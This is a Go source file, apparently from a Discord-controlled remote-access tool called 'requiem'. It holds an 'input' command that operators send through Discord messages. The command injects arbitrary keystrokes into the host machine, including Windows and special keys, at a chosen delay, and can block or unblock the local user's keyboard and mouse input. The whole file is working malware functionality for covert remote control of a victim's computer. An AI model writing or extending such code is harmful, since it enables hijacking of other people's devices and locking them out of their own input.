package commands

import (
	"fmt"
	"strings"
	"time"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

var specialKeys = map[string]uint16{
	"[ENTER]":     0x0D,
	"[SHIFT]":     0x10,
	"[CTRL]":      0x11,
	"[ALT]":       0x12,
	"[TAB]":       0x09,
	"[ESC]":       0x1B,
	"[BACKSPACE]": 0x08,
	"[DELETE]":    0x2E,
	"[SPACE]":     0x20,
	"[UP]":        0x26,
	"[DOWN]":      0x28,
	"[LEFT]":      0x25,
	"[RIGHT]":     0x27,
	"[HOME]":      0x24,
	"[END]":       0x23,
	"[F12]":       0x7B,
	"[CAPSLOCK]":  0x14,
	"[WINDOWS]":   0x5B,
}

func (*InputCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")

	if utils.HasFlag(content, "simulate") {
		text := utils.UnwrapQuotes(content)
		if text == "" {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to wrap the text to simulate in double quotes.", msg.Reference())
			return
		}

		delay, found := utils.FindNumber(content)
		if found == false {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a delay in millisecond.", msg.Reference())
			return
		}

		for len(text) > 0 {
			special := false
			for tag, vk := range specialKeys {
				if strings.HasPrefix(text, tag) {
					funcs.PressVirtualKey(vk)

					text = text[len(tag):]
					special = true
					break
				}
			}

			if !special {
				funcs.PressUnicodeKey(uint16(text[0]))
				text = text[1:]
			}

			if delay != 0 {
				time.Sleep(time.Duration(delay) * time.Millisecond)
			}
		}

		return
	}

	var err error

	if utils.HasFlag(content, "block") {
		err = funcs.DisableInputs(true)
	} else if utils.HasFlag(content, "unblock") {
		err = funcs.DisableInputs(false)
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
		return
	}

	if err == nil {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully set input.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to set input - %s", err), msg.Reference())
	}
}

func (*InputCommand) Name() string {
	return "input"
}

func (*InputCommand) Info() string {
	return "Block or unblock inputs to the device."
}

type InputCommand struct{}
